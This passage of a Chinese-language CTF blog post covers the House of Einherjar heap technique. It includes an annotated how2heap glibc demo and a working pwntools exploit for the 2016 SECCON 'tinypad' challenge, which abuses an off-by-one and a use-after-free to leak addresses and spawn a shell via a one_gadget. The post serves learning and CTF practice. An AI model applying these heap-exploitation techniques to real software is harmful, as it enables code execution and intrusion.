prev_size 来绕过unlink的大小检查</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\nMake sure that our fake chunk&#x27;s size is equal to c&#x27;s new prev_size.\n&quot;</span>);</span><br><span class="line">  a[<span class="number">1</span>] = fake_size;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Our fake chunk size is now %#lx (b.size + fake_prev_size)\n&quot;</span>, a[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Now we fill the tcache before we free chunk &#x27;c&#x27; to consolidate with our fake chunk</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\nFill tcache.\n&quot;</span>);</span><br><span class="line">  <span class="type">intptr_t</span>* x[<span class="number">7</span>];</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="keyword">sizeof</span>(x) / <span class="keyword">sizeof</span>(<span class="type">intptr_t</span>*); i++) &#123;</span><br><span class="line">    x[i] = <span class="built_in">malloc</span>(<span class="number">0xf8</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Fill up tcache list.\n&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="keyword">sizeof</span>(x) / <span class="keyword">sizeof</span>(<span class="type">intptr_t</span>*); i++) &#123;</span><br><span class="line">    <span class="built_in">free</span>(x[i]);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Now we free &#x27;c&#x27; and this will consolidate with our fake chunk since &#x27;c&#x27; prev_inuse is not set\n&quot;</span>);</span><br><span class="line">  <span class="built_in">free</span>(c);</span><br><span class="line">  <span class="comment">//free c后就会把b包裹起来放入unsortedbin里</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Our fake chunk size is now %#lx (c.size + fake_prev_size)\n&quot;</span>, a[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\nNow we can call malloc() and it will begin in our fake chunk\n&quot;</span>);</span><br><span class="line">  <span class="type">intptr_t</span>* d = <span class="built_in">malloc</span>(<span class="number">0x158</span>);</span><br><span class="line">  <span class="comment">//d会把b再次申请出来</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Next malloc(0x158) is at %p\n&quot;</span>, d);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// tcache poisoning</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;After the patch https://sourceware.org/git/?p=glibc.git;a=commit;h=77dc0d8643aa99c92bf671352b0a8adde705896f,\n&quot;</span></span><br><span class="line">    <span class="string">&quot;We have to create and free one more chunk for padding before fd pointer hijacking.\n&quot;</span>);</span><br><span class="line">  <span class="comment">//这里主要是防止后面申请堆块时 tcache_index&lt;0导致失败</span></span><br><span class="line">  <span class="type">uint8_t</span>* pad = <span class="built_in">malloc</span>(<span class="number">0x28</span>);</span><br><span class="line">  <span class="built_in">free</span>(pad);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\nNow we free chunk &#x27;b&#x27; to launch a tcache poisoning attack\n&quot;</span>);</span><br><span class="line">  <span class="built_in">free</span>(b);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Now the tcache list has [ %p -&gt; %p ].\n&quot;</span>, b, pad);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;We overwrite b&#x27;s fwd pointer using chunk &#x27;d&#x27;\n&quot;</span>);</span><br><span class="line">  <span class="comment">//修改tcache里b的下一个位空闲堆位目标地址</span></span><br><span class="line">  d[<span class="number">0x30</span> / <span class="number">8</span>] = (<span class="type">long</span>)stack_var;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// take target out</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Now we can cash out the target chunk.\n&quot;</span>);</span><br><span class="line">  <span class="built_in">malloc</span>(<span class="number">0x28</span>);</span><br><span class="line">  <span class="type">intptr_t</span>* e = <span class="built_in">malloc</span>(<span class="number">0x28</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\nThe new chunk is at %p\n&quot;</span>, e);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// sanity check</span></span><br><span class="line">  assert(e == stack_var);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Got control on target/stack!\n\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>主要就是和tcache poisoning配合来使用了 利用堆块b来覆写c的prevsize和previnuse为到fakechunk的a块，freec后触发合并并绕过unlink b堆块还在使用但是被包裹放入unsortedbin里</p>
<p><img src="/2023/07/29/House-Of-Einherjar/image-20230730223649416.png" alt="image-20230730223649416"></p>
<p>intptr_t* d &#x3D; malloc(0x158);会把b申请到d里，后面free掉b链入tcache</p>
<p><img src="/2023/07/29/House-Of-Einherjar/image-20230730224051202.png" alt="image-20230730224051202"></p>
<p>后面再利用d来覆写b的下一个空闲堆块为目标地址</p>
<p><img src="/2023/07/29/House-Of-Einherjar/image-20230730224245777.png" alt="image-20230730224245777">、</p>
<p>就可以申请出来了</p>
<h2 id="2016-Seccon-tinypad"><a href="#2016-Seccon-tinypad" class="headerlink" title="2016 Seccon tinypad"></a>2016 Seccon tinypad</h2><p>libc 2.23</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">/m/h/s/c/p/h/<span class="number">2016</span>_seccon_tinypad&gt; checksec tinypad </span><br><span class="line">[*] <span class="string">&#x27;/mnt/hgfs/share/ctfwiki/pwn/heap/2016_seccon_tinypad/tinypad&#x27;</span></span><br><span class="line">    Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No <span class="title function_">PIE</span> <span class="params">(<span class="number">0x400000</span>)</span></span><br></pre></td></tr></table></figure>

<p>自定的read_until有off by one的漏洞</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 __fastcall <span class="title function_">read_until</span><span class="params">(<span class="type">char</span> *a1, <span class="type">unsigned</span> __int64 len, <span class="type">int</span> <span class="built_in">terminate</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> __int64 i; <span class="comment">// [rsp+28h] [rbp-18h]</span></span><br><span class="line">  __int64 n; <span class="comment">// [rsp+30h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0LL</span>; i &lt; len; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    n = read_n(<span class="number">0LL</span>, &amp;a1[i], <span class="number">1LL</span>);</span><br><span class="line">    <span class="keyword">if</span> ( n &lt; <span class="number">0</span> )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">-1LL</span>;</span><br><span class="line">    <span class="keyword">if</span> ( !n || a1[i] == <span class="built_in">terminate</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  a1[i] = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( i == len &amp;&amp; a1[len - <span class="number">1</span>] != <span class="string">&#x27;\n&#x27;</span> )</span><br><span class="line">    dummyinput(<span class="built_in">terminate</span>);</span><br><span class="line">  <span class="keyword">return</span> i;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>delete时存在只是置零了大小，存在uaf</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">free</span>(*(<span class="type">void</span> **)&amp;tinypad[<span class="number">16</span> * idx + <span class="number">248</span>]);</span><br><span class="line">*(_QWORD *)&amp;tinypad[<span class="number">16</span> * idx + <span class="number">240</span>] = <span class="number">0LL</span>;</span><br><span class="line">writeln(<span class="string">&quot;\nDeleted.&quot;</span>, <span class="number">9uLL</span>);</span><br></pre></td></tr></table></figure>

<p>思路就是uaf泄露libc和heapbase，然后利用off by one来造成堆块重叠 就是2.31how2heap的例子，利用edit功能把管理区tinypad+256链入fastbin链表，申请到tinypad+256的管理区，由于edit功能时用来当前区域所存数据大小来作为重新读入的大小所以不能打free malloc的hook，只能利用environ全局变量，来泄露栈地址来覆盖main的返回地址为ogg</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">pwnfile=<span class="string">&#x27;./tinypad&#x27;</span></span><br><span class="line">elf = ELF(pwnfile)</span><br><span class="line">libcelf=elf.libc</span><br><span class="line">rop = ROP(pwnfile)</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">    io = remote()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = process(pwnfile)</span><br><span class="line">r = <span class="keyword">lambda</span> x: io.recv(x)</span><br><span class="line">ra = <span class="keyword">lambda</span>: io.recvall()</span><br><span class="line">rl = <span class="keyword">lambda</span>: io.recvline(keepends=<span class="literal">True</span>)</span><br><span class="line">ru = <span class="keyword">lambda</span> x: io.recvuntil(x, drop=<span class="literal">True</span>)</span><br><span class="line">s = <span class="keyword">lambda</span> x: io.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: io.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> x, y: io.sendafter(x, y)</span><br><span class="line">sla = <span class="keyword">lambda</span> x, y: io.sendlineafter(x, y)</span><br><span class="line">ia = <span class="keyword">lambda</span>: io.interactive()</span><br><span class="line">c = <span class="keyword">lambda</span>: io.close()</span><br><span class="line">li = <span class="keyword">lambda</span> x: log.info(x)</span><br><span class="line">db = <span class="keyword">lambda</span> x : gdb.attach(io,x)</span><br><span class="line">b = <span class="keyword">lambda</span> : gdb.attach(io)</span><br><span class="line">uu32 = <span class="keyword">lambda</span> x   : u32(x.ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> x   : u64(x.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">p =<span class="keyword">lambda</span> x,y:<span class="built_in">print</span>(<span class="string">&quot;\033[4;36;40m&quot;</span>+x+<span class="string">&quot;:\033[0m&quot;</span> + <span class="string">&quot;\033[7;33;40m[*]\033[0m &quot;</span> + <span class="string">&quot;\033[1;31;40m&quot;</span> + <span class="built_in">hex</span>(y) + <span class="string">&quot;\033[0m&quot;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_libc</span>(<span class="params">func_name,func_ad</span>):</span><br><span class="line">    p(func_name,func_ad)</span><br><span class="line">    <span class="keyword">global</span> libc </span><br><span class="line">    libc = LibcSearcher(func_name,func_ad)</span><br><span class="line">    libcbase=func_ad-libc.dump(func_name)</span><br><span class="line">    p(<span class="string">&#x27;libcbase&#x27;</span>,libcbase)</span><br><span class="line">    <span class="keyword">return</span> libcbase</span><br><span class="line"><span class="comment">#+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size, content</span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;(CMD)&gt;&gt;&gt; &#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;(SIZE)&gt;&gt;&gt; &#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(size).encode())</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;(CONTENT)&gt;&gt;&gt; &#x27;</span>)</span><br><span class="line">    io.sendline(content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx, content</span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;(CMD)&gt;&gt;&gt; &#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;e&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;(INDEX)&gt;&gt;&gt; &#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(idx).encode())</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;(CONTENT)&gt;&gt;&gt; &#x27;</span>)</span><br><span class="line">    io.sendline(content)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;Is it OK?\n&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;Y&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;(CMD)&gt;&gt;&gt; &#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;d&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;(INDEX)&gt;&gt;&gt; &#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(idx).encode())</span><br><span class="line"><span class="comment"># db(&#x27;b *0x0400B55&#x27;)# add readuntil</span></span><br><span class="line"><span class="comment"># db(&#x27;b *0x0400C12&#x27;)#delete free</span></span><br><span class="line"><span class="comment"># db(&#x27;b *0x040098C&#x27;)#menu show</span></span><br><span class="line"><span class="comment"># db(&#x27;b *0x00400E17&#x27;)#edit</span></span><br><span class="line"><span class="comment">#leak heapbase</span></span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">ru(<span class="string">b&#x27;#   INDEX: 3\n&#x27;</span>)</span><br><span class="line">ru(<span class="string">b&#x27;# CONTENT: &#x27;</span>)</span><br><span class="line">heapbase=uu64(r(<span class="number">4</span>))-<span class="number">0x30</span></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"><span class="comment">#leak libcbase</span></span><br><span class="line">add(<span class="number">0x90</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">16</span>)</span><br><span class="line">add(<span class="number">0x90</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">16</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">ru(<span class="string">b&#x27;#   INDEX: 1\n&#x27;</span>)</span><br><span class="line">ru(<span class="string">b&#x27;# CONTENT: &#x27;</span>)</span><br><span class="line">libcbase=uu64(r(<span class="number">6</span>))-<span class="number">0x3c4b78</span></span><br><span class="line">p(<span class="string">&#x27;libcbase&#x27;</span>,libcbase)</span><br><span class="line">p(<span class="string">&#x27;heapbase&#x27;</span>,heapbase)</span><br><span class="line">system=libcelf.sym[<span class="string">&#x27;system&#x27;</span>]+libcbase</span><br><span class="line">free_hook=libcelf.sym[<span class="string">&#x27;__free_hook&#x27;</span>]+libcbase</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">chun1=heapbase</span><br><span class="line">chun2=heapbase+<span class="number">0x30</span></span><br><span class="line">chun3=heapbase+<span class="number">0x60</span></span><br><span class="line">add(<span class="number">0x28</span>,flat(<span class="number">0</span>,<span class="number">0x20</span>,chun1+<span class="number">0x10</span>,chun1+<span class="number">0x10</span>,<span class="number">0x20</span>))</span><br><span class="line">add(<span class="number">0x28</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x28</span>)</span><br><span class="line">add(<span class="number">0xf0</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    edit(<span class="number">2</span>,<span class="string">b&#x27;b&#x27;</span>*(<span class="number">0x28</span>-i))</span><br><span class="line">edit(<span class="number">2</span>,<span class="string">b&#x27;b&#x27;</span>*<span class="number">0x20</span>+p64(chun3-chun1-<span class="number">0x10</span>))</span><br><span class="line"><span class="comment"># db(&#x27;b *0x0400C12&#x27;)#delete free</span></span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">0x50</span>,<span class="string">b&#x27;e&#x27;</span>*<span class="number">0x10</span>+p64(<span class="number">0x0</span>)+p64(<span class="number">0x31</span>)+p64(<span class="number">256</span>+<span class="number">0x0602040</span>-<span class="number">8</span>))</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x31</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x20</span>)<span class="comment">#绕过fastbin的大小检查</span></span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">b&#x27;c&#x27;</span>)</span><br><span class="line"><span class="comment"># db(&#x27;b *0x0400B55&#x27;)# add readuntil</span></span><br><span class="line">enviorn=libcbase+libcelf.sym[<span class="string">&#x27;__environ&#x27;</span>]</span><br><span class="line">add(<span class="number">0x20</span>,flat(enviorn,<span class="number">0x31</span>,<span class="number">256</span>+<span class="number">0x0602040</span>+<span class="number">8</span>))</span><br><span class="line">ru(<span class="string">b&#x27;#   INDEX: 1\n&#x27;</span>)</span><br><span class="line">ru(<span class="string">b&#x27;# CONTENT: &#x27;</span>)</span><br><span class="line">main_ret=uu64(r(<span class="number">6</span>))-(<span class="number">0x7ffebf17a478</span>-<span class="number">0x7ffebf17a388</span>)</span><br><span class="line">p(<span class="string">&#x27;ret&#x27;</span>,main_ret)</span><br><span class="line">ogg=libcbase+<span class="number">0x45226</span></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">0x45226 execve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  rax == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0x4527a execve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x30] == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0xf03a4 execve(&quot;/bin/sh&quot;, rsp+0x50, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x50] == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0xf1247 execve(&quot;/bin/sh&quot;, rsp+0x70, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x70] == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">edit(<span class="number">2</span>,p64(main_ret))</span><br><span class="line">edit(<span class="number">1</span>,p64(ogg))</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;(CMD)&gt;&gt;&gt; &#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;q&#x27;</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<p>写完之后去看了一眼wp，发现edit里会先把输入读到tinypad，可以直接用tinypad的区域来构造fakechunk，利用house of ejinherjar来申请到tinypad，这里要注意的是要在tinypad至少+0x20的位置去伪造fakechunk，因为后面申请的堆最大才0x100，太菜了刚开始没看出来呜呜</p>

  </div>
</article>



        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/archives/">Writing</a></li>
         
          <li><a href="/search/">Search</a></li>
         
          <li><a href="/tags/">Tag</a></li>
         
          <li><a href="/about/">About</a></li>
        
      </ul>
    </div>

    <div id="toc-footer" style="display: none">
      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#House-Of-Einherjar"><span class="toc-number">1.</span> <span class="toc-text">House Of Einherjar</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#2-23"><span class="toc-number">1.1.</span> <span class="toc-text">2.23</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#wiki%E4%B8%8A%E7%9A%84%E4%BE%8B%E5%AD%90"><span class="toc-number">1.1.1.</span> <span class="toc-text">wiki上的例子</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#how2heap%E4%BE%8B%E5%AD%90"><span class="toc-number">1.1.2.</span> <span class="toc-text">how2heap例子</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-31"><span class="toc-number">1.2.</span> <span class="toc-text">2.31</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#how2heap%E4%BE%8B%E5%AD%90-1"><span class="toc-number">1.2.1.</span> <span class="toc-text">how2heap例子</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2016-Seccon-tinypad"><span class="toc-number">1.3.</span> <span class="toc-text">2016 Seccon tinypad</span></a></li></ol></li></ol>
    </div>

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://grxer.gitee.io/2023/07/29/House-Of-Einherjar/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://grxer.gitee.io/2023/07/29/House-Of-Einherjar/&text=House Of Einherjar"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://grxer.gitee.io/2023/07/29/House-Of-Einherjar/&title=House Of Einherjar"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://grxer.gitee.io/2023/07/29/House-Of-Einherjar/&is_video=false&description=House Of Einherjar"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=House Of Einherjar&body=Check out this article: https://grxer.gitee.io/2023/07/29/House-Of-Einherjar/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://grxer.gitee.io/2023/07/29/House-Of-Einherjar/&title=House Of Einherjar"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://grxer.gitee.io/2023/07/29/House-Of-Einherjar/&title=House Of Einherjar"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://grxer.gitee.io/2023/07/29/House-Of-Einherjar/&title=House Of Einherjar"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://grxer.gitee.io/2023/07/29/House-Of-Einherjar/&title=House Of Einherjar"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://grxer.gitee.io/2023/07/29/House-Of-Einherjar/&name=House Of Einherjar&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://grxer.gitee.io/2023/07/29/House-Of-Einherjar/&t=House Of Einherjar"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-left">
    Copyright &copy;
    
    
    2023-2025
    bxz
  </div>
  <div class="footer-right">
    <nav>
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/archives/">Writing</a></li><!--
     --><!--
       --><li><a href="/search/">Search</a></li><!--
     --><!--
       --><li><a href="/tags/">Tag</a></li><!--
     --><!--
       --><li><a href="/about/">About</a></li><!--
     -->
      </ul>
    </nav>
  </div>
</footer>

    </div>
    <!-- styles -->



  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>


    <!-- jquery -->
 
  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 




<!-- clipboard -->

  
    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
  
  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
    btn += '<i class="far fa-clone"></i>';
    btn += '</span>'; 
    // mount it!
    $(".highlight table").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      text: function(trigger) {
        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "Copied!");
      e.clearSelection();
    })
  })
  </script>


<script src="/js/main.js"></script>

<!-- search -->

<!-- Google Analytics -->

<!-- Baidu Analytics -->

  <script type="text/javascript">
        var _hmt = _hmt || [];
        (function() {
          var hm = document.createElement("script");
          hm.src = "https://hm.baidu.com/hm.js?a22ef0bec4e4a9c7337bea6e37ff55c1";
          var s = document.getElementsByTagName("script")[0];
          s.parentNode.insertBefore(hm, s);
        })();
        </script>

<!-- Cloudflare Analytics -->

<!-- Umami Analytics -->

<!-- Disqus Comments -->

<!-- utterances Comments -->

</body>
</html>
